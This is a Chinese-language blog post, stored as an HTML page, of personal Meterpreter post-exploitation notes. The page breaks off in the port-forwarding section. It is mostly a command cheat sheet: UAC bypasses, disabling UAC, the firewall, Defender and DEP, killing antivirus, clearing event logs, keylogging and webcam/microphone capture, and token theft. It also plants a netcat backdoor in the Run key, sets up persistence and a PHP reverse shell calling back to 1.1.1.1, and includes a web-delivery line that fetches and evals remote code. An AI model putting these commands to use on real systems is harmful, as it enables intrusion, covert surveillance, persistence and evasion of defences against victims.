@@ -1,0 +1,777 @@
+<!DOCTYPE html>
+<html lang="en">
+    <!-- title -->
+
+
+
+
+<!-- keywords -->
+
+
+
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no" >
+    <meta name="author" content="R0ser1">
+    <meta name="renderer" content="webkit">
+    <meta name="copyright" content="R0ser1">
+    
+    <meta name="keywords" content="hexo,hexo-theme,hexo-blog">
+    
+    <meta name="description" content="">
+    <meta name="description" content="仅此记录自己的学习笔记罢了。持续更新本文章  Msf后渗透测试阶段做什么  -提权 -信息收集 -渗透内网 -永久后门  在meterpreter中首先要获取system账号权限-load priv -getsystem▪ priv_elevate_getsystem: Operation failed: Access is denied. &#x2F;&#x2F;说明有UAC限制 绕过UAC限制use exploi">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Meterpreter后渗透">
+<meta property="og:url" content="http://example.com/2021/03/21/Meterpreter%E5%90%8E%E6%B8%97%E9%80%8F/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="仅此记录自己的学习笔记罢了。持续更新本文章  Msf后渗透测试阶段做什么  -提权 -信息收集 -渗透内网 -永久后门  在meterpreter中首先要获取system账号权限-load priv -getsystem▪ priv_elevate_getsystem: Operation failed: Access is denied. &#x2F;&#x2F;说明有UAC限制 绕过UAC限制use exploi">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://tva2.sinaimg.cn/large/008gTZraly1gork2plqh3j30xc0fvwmh.jpg">
+<meta property="og:image" content="https://tva2.sinaimg.cn/large/008gTZraly1gork1rrh3oj30op0bx3za.jpg">
+<meta property="og:image" content="https://tvax1.sinaimg.cn/large/008gTZraly1gork3n1visj313n0f7jwx.jpg">
+<meta property="og:image" content="https://tvax1.sinaimg.cn/large/008gTZraly1gorkbtd6edj30rk0e8t9i.jpg">
+<meta property="article:published_time" content="2021-03-21T07:18:00.000Z">
+<meta property="article:modified_time" content="2021-03-21T07:44:58.612Z">
+<meta property="article:author" content="R0ser1">
+<meta property="article:tag" content="meterpreter">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://tva2.sinaimg.cn/large/008gTZraly1gork2plqh3j30xc0fvwmh.jpg">
+    <meta http-equiv="Cache-control" content="no-cache">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"/>
+    
+    <title>Meterpreter后渗透 · R0ser1&#39;s Blog</title>
+    <style type="text/css">
+    @font-face {
+        font-family: 'Oswald-Regular';
+        src: url("/font/Oswald-Regular.ttf");
+    }
+
+    body {
+        margin: 0;
+    }
+
+    header,
+    footer,
+    .back-top,
+    .sidebar,
+    .container,
+    .site-intro-meta,
+    .toc-wrapper {
+        display: none;
+    }
+
+    .site-intro {
+        position: relative;
+        z-index: 3;
+        width: 100%;
+        /* height: 50vh; */
+        overflow: hidden;
+    }
+
+    .site-intro-placeholder {
+        position: absolute;
+        z-index: -2;
+        top: 0;
+        left: 0;
+        width: calc(100% + 300px);
+        height: 100%;
+        background: repeating-linear-gradient(-45deg, #444 0, #444 80px, #333 80px, #333 160px);
+        background-position: center center;
+        transform: translate3d(-226px, 0, 0);
+        animation: gradient-move 2.5s ease-out 0s infinite;
+    }
+
+    @keyframes gradient-move {
+        0% {
+            transform: translate3d(-226px, 0, 0);
+        }
+        100% {
+            transform: translate3d(0, 0, 0);
+        }
+    }
+
+</style>
+
+    <link rel="preload" href= "/css/style.css?v=20210204" as="style" onload="this.onload=null;this.rel='stylesheet'" />
+    <link rel="stylesheet" href= "/css/mobile.css?v=20210204" media="(max-width: 980px)">
+    
+    <link rel="preload" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'" />
+    
+    <!-- /*! loadCSS. [c]2017 Filament Group, Inc. MIT License */
+/* This file is meant as a standalone workflow for
+- testing support for link[rel=preload]
+- enabling async CSS loading in browsers that do not support rel=preload
+- applying rel preload css once loaded, whether supported or not.
+*/ -->
+<script>
+(function( w ){
+	"use strict";
+	// rel=preload support test
+	if( !w.loadCSS ){
+		w.loadCSS = function(){};
+	}
+	// define on the loadCSS obj
+	var rp = loadCSS.relpreload = {};
+	// rel=preload feature support test
+	// runs once and returns a function for compat purposes
+	rp.support = (function(){
+		var ret;
+		try {
+			ret = w.document.createElement( "link" ).relList.supports( "preload" );
+		} catch (e) {
+			ret = false;
+		}
+		return function(){
+			return ret;
+		};
+	})();
+
+	// if preload isn't supported, get an asynchronous load by using a non-matching media attribute
+	// then change that media back to its intended value on load
+	rp.bindMediaToggle = function( link ){
+		// remember existing media attr for ultimate state, or default to 'all'
+		var finalMedia = link.media || "all";
+
+		function enableStylesheet(){
+			link.media = finalMedia;
+		}
+
+		// bind load handlers to enable media
+		if( link.addEventListener ){
+			link.addEventListener( "load", enableStylesheet );
+		} else if( link.attachEvent ){
+			link.attachEvent( "onload", enableStylesheet );
+		}
+
+		// Set rel and non-applicable media type to start an async request
+		// note: timeout allows this to happen async to let rendering continue in IE
+		setTimeout(function(){
+			link.rel = "stylesheet";
+			link.media = "only x";
+		});
+		// also enable media after 3 seconds,
+		// which will catch very old browsers (android 2.x, old firefox) that don't support onload on link
+		setTimeout( enableStylesheet, 3000 );
+	};
+
+	// loop through link elements in DOM
+	rp.poly = function(){
+		// double check this to prevent external calls from running
+		if( rp.support() ){
+			return;
+		}
+		var links = w.document.getElementsByTagName( "link" );
+		for( var i = 0; i < links.length; i++ ){
+			var link = links[ i ];
+			// qualify links to those with rel=preload and as=style attrs
+			if( link.rel === "preload" && link.getAttribute( "as" ) === "style" && !link.getAttribute( "data-loadcss" ) ){
+				// prevent rerunning on link
+				link.setAttribute( "data-loadcss", true );
+				// bind listeners to toggle media back
+				rp.bindMediaToggle( link );
+			}
+		}
+	};
+
+	// if unsupported, run the polyfill
+	if( !rp.support() ){
+		// run once at least
+		rp.poly();
+
+		// rerun poly on an interval until onload
+		var run = w.setInterval( rp.poly, 500 );
+		if( w.addEventListener ){
+			w.addEventListener( "load", function(){
+				rp.poly();
+				w.clearInterval( run );
+			} );
+		} else if( w.attachEvent ){
+			w.attachEvent( "onload", function(){
+				rp.poly();
+				w.clearInterval( run );
+			} );
+		}
+	}
+
+
+	// commonjs
+	if( typeof exports !== "undefined" ){
+		exports.loadCSS = loadCSS;
+	}
+	else {
+		w.loadCSS = loadCSS;
+	}
+}( typeof global !== "undefined" ? global : this ) );
+</script>
+
+    <link rel="icon" href= "https://tva2.sinaimg.cn/large/00774lbQly1gsk7gp4qw1j30qo0qojtw.jpg" />
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js" as="script" />
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js" as="script" />
+    <link rel="preload" href="/scripts/main.js?v=20210204" as="script" />
+    <link rel="preload" as="font" href="/font/Oswald-Regular.ttf" crossorigin>
+    <link rel="preload" as="font" href="https://at.alicdn.com/t/font_327081_1dta1rlogw17zaor.woff" crossorigin>
+    <script src="https://cdn.bootcdn.net/ajax/libs/font-awesome/5.15.3/js/all.min.js"  data-auto-replace-svg="nest" ></script>
+    
+    <!-- fancybox -->
+    <script src="https://lf26-cdn-tos.bytecdntp.com/cdn/expire-1-M/fancybox/3.2.5/jquery.fancybox.min.js" defer></script>
+    <!-- 百度统计  -->
+    
+    <!-- 谷歌统计  -->
+    
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+    
+        <body class="post-body">
+    
+    
+<header class="header">
+
+    <!-- top read progress line -->
+    <div class="header-element">
+        
+        <div class="read-progress"></div>
+        
+    </div>
+    <!-- sidebar menu button -->
+    <div class="header-element">
+        
+        <div class="header-sidebar-menu">
+        
+            
+            <div style="padding-left: 1px;">&#xe775;</div>
+            
+        </div>
+    </div>
+    <!-- back to home page text -->
+    <a class="home-link header-element" href=/>R0ser1's Blog</a>
+    <!-- toggle banner for post layout -->
+    
+    
+    <div class="banner">
+    
+        <div class="blog-title header-element">
+            <a href="/" >R0ser1&#39;s Blog</a>
+        </div>
+        <div class="post-title header-element">
+            <a href="#" class="post-name">Meterpreter后渗透</a>
+        </div>
+    </div>
+    
+</header>
+    
+<footer class="footer-fixed">
+
+    <!-- back to top button -->
+    <div class="footer-fixed-element">
+        
+        <div class="back-top">
+        
+            
+            <div>&#xe639;</div>
+            
+        </div>
+    </div>
+</footer>
+    <div class="wrapper">
+        <div class="site-intro" style="
+
+
+
+
+
+
+
+height:50vh;
+">
+    
+    <!-- 主页  -->
+    
+    
+    <!-- 404页  -->
+            
+    <div class="site-intro-placeholder"></div>
+    <div class="site-intro-img" style="background-image: url(https://tvax1.sinaimg.cn/large/00774lbQly1gsk7i9yw6zj31z413jgra.jpg)"></div>
+    <div class="site-intro-meta">
+        <!-- 标题  -->
+        <h1 class="intro-title">
+            <!-- 主页  -->
+            
+            Meterpreter后渗透
+            <!-- 404 -->
+            
+        </h1>
+        <!-- 副标题 -->
+        <p class="intro-subtitle">
+            <!-- 主页副标题  -->
+            
+            
+            <!-- 404 -->
+            
+        </p>
+        <!-- 文章页meta -->
+        
+            <div class="post-intros">
+                <!-- 文章页标签  -->
+                
+                    <div class= post-intro-tags >
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags = "meterpreter">meterpreter</a>
+    
+</div>
+                
+                
+                    <div class="post-intro-read">
+                        <span>Word count: <span class="post-count word-count">2.1k</span>Reading time: <span class="post-count reading-time">9 min</span></span>
+                    </div>
+                
+                <div class="post-intro-meta">
+                    <span class="post-intro-calander iconfont-archer">&#xe676;</span>
+                    <span class="post-intro-time">2021/03/21</span>
+                    
+                    <span id="busuanzi_container_page_pv" class="busuanzi-pv">
+                        <span class="iconfont-archer">&#xe602;</span>
+                        <span id="busuanzi_value_page_pv"></span>
+                    </span>
+                    
+                    <span class="shareWrapper">
+                        <span class="iconfont-archer shareIcon">&#xe71d;</span>
+                        <span class="shareText">Share</span>
+                        <ul class="shareList">
+                            <li class="iconfont-archer share-qr" data-type="qr">&#xe75b;
+                                <div class="share-qrcode"></div>
+                            </li>
+                            <li class="iconfont-archer" data-type="weibo">&#xe619;</li>
+                            <li class="iconfont-archer" data-type="qzone">&#xe62e;</li>
+                            <li class="iconfont-archer" data-type="twitter">&#xe634;</li>
+                            <li class="iconfont-archer" data-type="facebook">&#xe67a;</li>
+                        </ul>
+                    </span>
+                </div>
+            </div>
+        
+    </div>
+</div>
+        <script>
+ 
+  // get user agent
+  var browser = {
+    versions: function () {
+      var u = window.navigator.userAgent;
+      return {
+        userAgent: u,
+        trident: u.indexOf('Trident') > -1, //IE内核
+        presto: u.indexOf('Presto') > -1, //opera内核
+        webKit: u.indexOf('AppleWebKit') > -1, //苹果、谷歌内核
+        gecko: u.indexOf('Gecko') > -1 && u.indexOf('KHTML') == -1, //火狐内核
+        mobile: !!u.match(/AppleWebKit.*Mobile.*/), //是否为移动终端
+        ios: !!u.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/), //ios终端
+        android: u.indexOf('Android') > -1 || u.indexOf('Linux') > -1, //android终端或者uc浏览器
+        iPhone: u.indexOf('iPhone') > -1 || u.indexOf('Mac') > -1, //是否为iPhone或者安卓QQ浏览器
+        iPad: u.indexOf('iPad') > -1, //是否为iPad
+        webApp: u.indexOf('Safari') == -1, //是否为web应用程序，没有头部与底部
+        weixin: u.indexOf('MicroMessenger') == -1, //是否为微信浏览器
+        uc: u.indexOf('UCBrowser') > -1 //是否为android下的UC浏览器
+      };
+    }()
+  }
+  console.log("userAgent:" + browser.versions.userAgent);
+
+  // callback
+  function fontLoaded() {
+    console.log('font loaded');
+    if (document.getElementsByClassName('site-intro-meta')) {
+      document.getElementsByClassName('intro-title')[0].classList.add('intro-fade-in');
+      document.getElementsByClassName('intro-subtitle')[0].classList.add('intro-fade-in');
+      var postIntros = document.getElementsByClassName('post-intros')[0]
+      if (postIntros) {
+        postIntros.classList.add('post-fade-in');
+      }
+    }
+  }
+
+  // UC不支持跨域，所以直接显示
+  function asyncCb(){
+    if (browser.versions.uc) {
+      console.log("UCBrowser");
+      fontLoaded();
+    } else {
+      WebFont.load({
+        custom: {
+          families: ['Oswald-Regular']
+        },
+        loading: function () {  //所有字体开始加载
+          // console.log('loading');
+        },
+        active: function () {  //所有字体已渲染
+          fontLoaded();
+        },
+        inactive: function () { //字体预加载失败，无效字体或浏览器不支持加载
+          console.log('inactive: timeout');
+          fontLoaded();
+        },
+        timeout: 5000 // Set the timeout to two seconds
+      });
+    }
+  }
+
+  function asyncErr(){
+    console.warn('script load from CDN failed, will load local script')
+  }
+
+  // load webfont-loader async, and add callback function
+  function async(u, cb, err) {
+    var d = document, t = 'script',
+      o = d.createElement(t),
+      s = d.getElementsByTagName(t)[0];
+    o.src = u;
+    if (cb) { o.addEventListener('load', function (e) { cb(null, e); }, false); }
+    if (err) { o.addEventListener('error', function (e) { err(null, e); }, false); }
+    s.parentNode.insertBefore(o, s);
+  }
+
+  var asyncLoadWithFallBack = function(arr, success, reject) {
+      var currReject = function(){
+        reject()
+        arr.shift()
+        if(arr.length)
+          async(arr[0], success, currReject)
+        }
+
+      async(arr[0], success, currReject)
+  }
+
+  asyncLoadWithFallBack([
+    "https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js", 
+    "https://cdn.bootcss.com/webfont/1.6.28/webfontloader.js",
+    "/lib/webfontloader.min.js"
+  ], asyncCb, asyncErr)
+</script>        
+        <img class="loading" src="/assets/loading.svg" style="display: block; margin: 6rem auto 0 auto; width: 6rem; height: 6rem;" />
+        <div class="container container-unloaded">
+            <main class="main post-page">
+    <article class="article-entry">
+        <center>仅此记录自己的学习笔记罢了。持续更新本文章</center>
+
+<p>Msf后渗透测试阶段做什么</p>
+<ul>
+<li>-提权</li>
+<li>-信息收集</li>
+<li>-渗透内网</li>
+<li>-永久后门</li>
+</ul>
+<p>在meterpreter中首先要获取system账号权限<br>-load priv -getsystem<br>▪ priv_elevate_getsystem: Operation failed: Access is denied. //说明有UAC限制</p>
+<h1 id="绕过UAC限制"><a href="#绕过UAC限制" class="headerlink" title="绕过UAC限制"></a>绕过UAC限制</h1><p>use exploit/windows/local/ask //就是需要请求ask同意我才能执行’ VNC去访问那种<br>▪ set session<br>▪ set filename<br><img src="https://tva2.sinaimg.cn/large/008gTZraly1gork2plqh3j30xc0fvwmh.jpg" alt="2064441-20210202144651704-921871329"></p>
+<p>此时session会多出来一个新的具有system权限的session //这种方法就不是一定成功的</p>
+<p>use exploit/windows/local/bypassuac</p>
+<p>使用它即可上传一个exe直接bypass UAC !<br><img src="https://tva2.sinaimg.cn/large/008gTZraly1gork1rrh3oj30op0bx3za.jpg" alt="2064441-20210202144855371-1848364274"></p>
+<p>use exploit/windows/local/bypassuac_injection</p>
+<p>是上传一个dll注入bypass的 如果他不是Administrator组的 那么就需要直接利用漏洞直接提权</p>
+<p>use exploit/windows/local/ 利用本地系统漏洞然后提权 //</p>
+<p>migrate 将你的shell进程迁移到另一个进程中 //getsystem不成功 可能需要将他转移到其他的系统进程即可</p>
+<h2 id="图形化payload"><a href="#图形化payload" class="headerlink" title="图形化payload"></a>图形化payload</h2><p>– set payload windows/vncinject/reverse_tcp – set viewonly no //就可以直接VNC操作</p>
+<p>Psexec 模块之 Passthehash 可以直接hash登录</p>
+<p>加载kiwi模块以前的mimikatz然后可以抓取当前的明文密码</p>
+<p>use exploit/windows/smb/psexec 设置相应的smbuser和smbpass 但是需要提前关闭UAC</p>
+<h2 id="关闭UAC"><a href="#关闭UAC" class="headerlink" title="关闭UAC"></a>关闭UAC</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cmd.exe &#x2F;k %windir%\System32\reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System &#x2F;v EnableLUA &#x2F;t REG_DWORD &#x2F;d 0 &#x2F;f</span><br><span class="line"></span><br><span class="line">cmd.exe &#x2F;k %windir%\System32\reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\system &#x2F;v LocalAccountTokenFilterPolicy &#x2F;t REG_DWORD &#x2F;d 1 &#x2F;f</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://tvax1.sinaimg.cn/large/008gTZraly1gork3n1visj313n0f7jwx.jpg" alt="2064441-20210202145342267-1344473413"></p>
+<p>我们可以看到是关闭了 但是需要重启</p>
+<h1 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">– netsh advfirewall set allprofiles state off &#x2F;&#x2F;on是开启 关闭防火墙需要管理员或者system权限</span><br><span class="line">– net stop windefend &#x2F;&#x2F;关闭Windefend </span><br><span class="line">– manage-bde -off C:    &#x2F;&#x2F;Bitlocker磁盘加密</span><br><span class="line">– manage-bde -status C:</span><br><span class="line">– bcdedit.exe &#x2F;set &#123;current&#125; nx AlwaysOff &#x2F;&#x2F;关闭DEP</span><br><span class="line">– Run killav&#x2F;&#x2F;杀死防毒软件</span><br><span class="line">– run post&#x2F;windows&#x2F;manage&#x2F;killa</span><br><span class="line">– run post&#x2F;windows&#x2F;manage&#x2F;enable_rd&#x2F;&#x2F;开启远程桌面服务</span><br><span class="line">– run getgui –e</span><br><span class="line">▪ run getgui -u -p &#x2F;&#x2F;添加账号密码</span><br><span class="line">▪run multi_console_command -rc &#x2F;root&#x2F;.msf4&#x2F;logs&#x2F;scripts&#x2F;getgui&#x2F;clean_up__20160824.1855.rc &#x2F;&#x2F;关闭远程桌面 文件是开启自动生成的</span><br><span class="line">查看远程桌面</span><br><span class="line">– screenshot &#x2F;&#x2F;截图当前桌面‘ 清晰</span><br><span class="line">– use espia &#x2F;&#x2F;插件</span><br><span class="line">screengrab&#x2F;&#x2F;截取当前桌面’模糊一点</span><br><span class="line">webcam&#x2F;&#x2F;摄像头命令</span><br><span class="line">webcam_list &#x2F;&#x2F;查看摄像头 webcam_snap #通过摄像头拍照 </span><br><span class="line">webcam_stream #通过摄像头开启视频</span><br><span class="line">clearev &#x2F;&#x2F;清除windows中的应用程序日志、系统日志、安全日志</span><br><span class="line"></span><br><span class="line">enumdesktops    --&gt;列出所有可访问的桌面和窗口站（窗体列表）</span><br><span class="line">getdesktop      --&gt;得到当前的Meterpreter桌面</span><br><span class="line">idletime        --&gt;返回秒远程用户已经闲置数量</span><br><span class="line">keyscan_dump    --&gt;转储按键缓冲（下载键盘记录）</span><br><span class="line">keyscan_start   --&gt;开始捕获击键（开始键盘记录）</span><br><span class="line">keyscan_stop    --&gt;停止捕获击键（停止键盘记录）</span><br><span class="line">screenshot      --&gt;抓取交互式桌面截图（当前操作界面截图一张）</span><br><span class="line">uictl           --&gt;控制一些用户界面组件（获取键盘、鼠标控制权）</span><br><span class="line">使用uictl -h 查看帮助（打开&#x2F;关闭，键盘&#x2F;鼠标）</span><br><span class="line">PS：键盘记录注意点，先开始，后下载，再结束，否则会出错</span><br><span class="line">摄像头：Stdapi: Webcam Commands（摄像头命令）</span><br><span class="line">record_mic       --&gt;X秒从默认的麦克风record_mic音频记录（音频录制）</span><br><span class="line">webcam_chat      --&gt;开始视频聊天（视频，对方会有弹窗）</span><br><span class="line">webcam_list      --&gt;单摄像头（查看摄像头列表）</span><br><span class="line">webcam_snap      --&gt;采取快照从指定的摄像头（摄像头拍摄一张照片）</span><br><span class="line">webcam_stream    --&gt;播放视频流从指定的摄像头（开启摄像头监控）</span><br></pre></td></tr></table></figure>
+<h1 id="令牌操纵-incognito假冒令牌"><a href="#令牌操纵-incognito假冒令牌" class="headerlink" title="令牌操纵(incognito假冒令牌)"></a>令牌操纵(incognito假冒令牌)</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">use incognito #help incognito 查看帮助 </span><br><span class="line">list_tokens -u #查看可用的token </span><br><span class="line">impersonate_token &#39;NT AUTHORITY\SYSTEM&#39; #假冒SYSTEM token </span><br><span class="line">或者impersonate_token NT\ AUTHORITY\\SYSTEM #不加单引号 </span><br><span class="line">需使用\\ execute -f cmd.exe -i –t # -t 使用假冒的token 执行 或者直接shell rev2self #返回原始token</span><br><span class="line">steal_token窃取令牌</span><br><span class="line">steal_token &lt;pid值&gt; #从指定进程中窃取token 先ps drop_token #删除窃取的token</span><br></pre></td></tr></table></figure>
+
+<h1 id="注册表添加NC后门服务-meterpreter"><a href="#注册表添加NC后门服务-meterpreter" class="headerlink" title="注册表添加NC后门服务(meterpreter)"></a>注册表添加NC后门服务(meterpreter)</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">upload &#x2F;usr&#x2F;share&#x2F;windows-binaries&#x2F;nc.exe C:\\windows\\system32</span><br><span class="line">reg enumkey -k HKLM\\software\\microsoft\\windows\\currentversion\\run</span><br><span class="line">reg setval -k HKLM\\software\\microsoft\\windows\\currentversion\\run -v nc -d &#39;C:\windows\system32\nc.exe -Ldp 444 -e cmd.exe&#39; </span><br><span class="line">reg queryval -k HKLM\software\microsoft\windows\currentversion\Run - v nc &#x2F;&#x2F;查询是否加入到注册表了</span><br></pre></td></tr></table></figure>
+
+<h2 id="Nc的一些用法"><a href="#Nc的一些用法" class="headerlink" title="Nc的一些用法"></a>Nc的一些用法</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&#x2F;&#x2F;这里以Windows7为例，如果你们Windows7是64位那么文件到system32 会重定向到sysWOW64，因为Windows 64位版本上的%windir%\System32文件夹中没有32位内容。</span><br><span class="line">所以上面路径也要改了。 reg setval -k HKLM\software\microsoft\windows\currentversion\run -v nc -d &#39;C:\windows\sysWOW64\nc.exe -Ldp 444 -e cmd.exe&#39;</span><br><span class="line">这个和你生成的shellcode是有关系的。生成的shellcode是x64是不存在这种情况的 windows&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcp</span><br><span class="line">ps:这个就需要关闭防火墙,但是为了更加隐蔽我们可以开启策略</span><br><span class="line">execute -f cmd -i -H &#x2F;&#x2F;执行cmd -H是隐蔽运行 -i是交互 这里用shell和这个还是有区别的 各位可以自己测试</span><br><span class="line"></span><br><span class="line">OPTIONS:</span><br><span class="line">netsh firewall show opmode&#x2F;&#x2F;检查是否开启防火墙</span><br><span class="line">netsh firewall add portopening TCP 444 &quot;这个名字自己看着随便来&quot; ENABLE ALL &#x2F;&#x2F;添加策略</span><br></pre></td></tr></table></figure>
+
+<p>抓包(meterpreter)</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">– load sniffer</span><br><span class="line">– sniffer_interfaces</span><br><span class="line">– sniffer_start 2</span><br><span class="line">– sniffer_dump 2 1.cap</span><br><span class="line">在内存中缓存区循环抓包(50000包)，不写硬盘</span><br><span class="line">只能过滤meterpreter流量，传输全过程SSL&#x2F;TLS加密</span><br></pre></td></tr></table></figure>
+
+<h2 id="解码"><a href="#解码" class="headerlink" title="解码"></a>解码</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">一些协议 访问什么的 内容基本看不到</span><br><span class="line">– use auxiliary&#x2F;sniffer&#x2F;psnuffle</span><br><span class="line">– set PCAPFILE 1.cap</span><br></pre></td></tr></table></figure>
+
+<p>set exitonsession 为false就是持续的 没连接一个就获得一个session</p>
+<h1 id="POST模块"><a href="#POST模块" class="headerlink" title="POST模块"></a>POST模块</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">– run post&#x2F;windows&#x2F;gather&#x2F;arp_scanner RHOSTS&#x3D;2.1.1.0&#x2F;24 &#x2F;&#x2F;arp嗅探</span><br><span class="line">– run post&#x2F;windows&#x2F;gather&#x2F;checkvm &#x2F;&#x2F;检查是否是虚拟机</span><br><span class="line">– run post&#x2F;windows&#x2F;gather&#x2F;credentials&#x2F;credential_collector &#x2F;&#x2F;token</span><br><span class="line">– run post&#x2F;windows&#x2F;gather&#x2F;enum_applications &#x2F;&#x2F; 装的软件</span><br><span class="line">– run post&#x2F;windows&#x2F;gather&#x2F;enum_logged_on_users &#x2F;&#x2F;账号正处于登录状态</span><br><span class="line">– run post&#x2F;windows&#x2F;gather&#x2F;enum_snmp&#x2F;&#x2F;  snmp</span><br><span class="line">– run post&#x2F;multi&#x2F;recon&#x2F;local_exploit_suggester &#x2F;&#x2F;存在提权漏洞</span><br><span class="line">– run post&#x2F;windows&#x2F;manage&#x2F;delete_user USERNAME&#x3D;账号名字 &#x2F;&#x2F;删除账号</span><br><span class="line">– run post&#x2F;multi&#x2F;gather&#x2F;env &#x2F;&#x2F;环境配置</span><br></pre></td></tr></table></figure>
+
+<h1 id="持久后门-meterpreter6的话是弃用这个脚本"><a href="#持久后门-meterpreter6的话是弃用这个脚本" class="headerlink" title="持久后门(meterpreter6的话是弃用这个脚本)"></a>持久后门(meterpreter6的话是弃用这个脚本)</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">– run persistence -h</span><br><span class="line">– run persistence -X -i 10 -p 4444 -r 1.1.1.1</span><br><span class="line">– run persistence -U -i 20 -p 4444 -r 1.1.1.1</span><br><span class="line">– run persistence -S -i 20 -p 4444 -r 1.1.1.1</span><br></pre></td></tr></table></figure>
+
+<p>use exploit/windows/local/persistence</p>
+<p><img src="https://tvax1.sinaimg.cn/large/008gTZraly1gorkbtd6edj30rk0e8t9i.jpg" alt="2064441-20210205130840499-1872520915"></p>
+<p>PHP shell 和 Web Delivery</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">-msfvenom -p php&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;1.1.1.1 LPORT&#x3D;3333 -f </span><br><span class="line">raw -o a.php</span><br><span class="line">MSF启动侦听</span><br><span class="line">上传WEB站点通过游览器访问</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;分割&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">–利用代码执行漏洞访问攻击者服务器 </span><br><span class="line">– use exploit&#x2F;multi&#x2F;script&#x2F;web_delivery – set target 1 – php -d allow_url_fopen&#x3D;true -r “eval(file_get_contents(‘http:&#x2F;&#x2F;1.1.1.1&#x2F; fTYWqmu&#39;));&quot;</span><br></pre></td></tr></table></figure>
+
+<h1 id="端口转发和代理"><a href="#端口转发和代理" class="headerlink" title="端口转发和代理"></a>端口转发和代理</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">1.portfwd</span><br><span class="line">portfwd是meterpreter提供的端口转发功能，在meterpreter下使用portfwd -h命令查看该命令的参数。</span><br><span class="line">常用参数：</span><br><span class="line">-l：本地监听端口</span><br><span class="line">-r：内网目标的ip</span><br><span class="line">-p：内网目标的端口</span><br><span class="line"></span><br><span class="line">上面命令执行之后，会将10.1.1.3的3389端口转发到本地的2222端口。</span><br><span 